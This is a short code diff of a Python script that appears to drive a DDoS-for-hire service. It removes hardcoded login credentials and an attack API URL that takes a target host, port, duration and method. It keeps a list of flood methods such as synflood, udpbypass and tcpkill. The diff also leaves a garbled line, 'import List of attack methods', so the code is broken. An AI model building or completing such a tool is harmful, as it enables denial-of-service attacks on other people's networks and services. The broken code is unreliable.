@@ -1,13 +1,6 @@
 import requests
 import time
-import os
-
-# API credentials
-USERNAME = "Iamgeo1"
-PASSWORD = "5671"
-API_ENDPOINT = "https://cypherservices.su/api/attack?username={USERNAME}&secret={PASSWORD}&host={HOST}&time={TIME}&port={PORT}&method={METHOD}"
-
-# List of attack methods
+import List of attack methods
 ATTACK_METHODS = [
     "homehold", "synflood", "discord", "telegram", "openvpn", "tcpkill", "tcpmix", "udpgostorm", "ovh",
     "ssh", "tcpboom", "udpbypass", "stun", "mixamp", "homekill", "dns", "game", "fivem", "tls", "http",
